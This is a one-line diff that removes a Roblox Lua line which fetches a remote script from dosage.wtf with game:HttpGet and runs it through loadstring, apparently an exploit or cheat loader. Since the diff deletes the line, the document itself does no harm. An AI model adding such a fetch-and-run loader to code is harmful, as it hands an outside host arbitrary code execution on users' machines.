@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://dosage.wtf/files/loader.lua'),true))()
